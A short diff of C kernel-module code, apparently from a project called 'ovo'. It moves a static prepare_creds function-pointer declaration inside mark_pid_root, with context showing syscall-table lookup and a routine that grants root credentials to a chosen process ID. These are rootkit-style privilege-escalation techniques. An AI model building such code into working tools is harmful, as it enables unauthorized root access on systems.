@@ -95,6 +95,8 @@ unsigned long *ovo_find_syscall_table(void) {
 }
 
 int mark_pid_root(pid_t pid) {
+    static struct cred* (*my_prepare_creds)(void) = NULL;
+
     struct pid * pid_struct;
     struct task_struct *task;
     kuid_t kuid;
@@ -111,8 +113,6 @@ int mark_pid_root(pid_t pid) {
         printk(KERN_ERR "[ovo] Failed to get current task info.\n");
         return -1;
     }
-
-    static struct cred* (*my_prepare_creds)(void) = NULL;
 
     if (my_prepare_creds == NULL) {
         my_prepare_creds = (void *) ovo_kallsyms_lookup_name("prepare_creds");
